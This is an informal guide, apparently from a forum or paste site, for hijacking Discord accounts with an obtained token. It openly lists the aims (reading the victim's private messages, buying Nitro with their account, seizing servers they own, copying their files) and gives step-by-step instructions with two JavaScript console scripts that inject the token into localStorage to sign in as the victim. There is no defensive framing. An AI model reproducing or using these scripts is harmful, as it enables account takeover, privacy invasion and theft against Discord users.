What does this script do?
Bypass Discord Token, you can sign-in their account.


What the Point of this
Read Private message, Buy Gift nitro, own discord servers (if you have ownership to them, cop their files (paid),(important) anything along these lines.)

Important Notice:You should have a valid token first of all, now head to discord you can do this while on you're personal account (but you will get signed out ofc). 
or you can go incognito and do this ( If you don't want to get signed-out of your own account.), you should always be prepared like have the token ready in the script and copied.



                                                     Were going to begin! revv your engine lol..


now just open the console in the discord tab, Hold Ctrl+Shift+i and you are on the console paste the script and press enter If you get the connecting sign then you'r token is working.  (no you cannot change pass, unless you know their pass.))

 


                                                     Script 1(Recommended)

 
________________________________________________________________________________________________________________________________________

function login(token) {
    setInterval(() => {
        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`;
    }, 50);
    setTimeout(() => {
        location.reload();
    }, 100);
}
login("Token_Here");

________________________________________________________________________________________________________________________________________



 

                                                         Script 2(Old)

 
________________________________________________________________________________________________________________________________________

(function() {
    window.t = "TOKEN_HERE";
    window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;
    window.setInterval(() => window.localStorage.token = `"${window.t}"`);
    window.location.reload();
})();
________________________________________________________________________________________________________________________________________



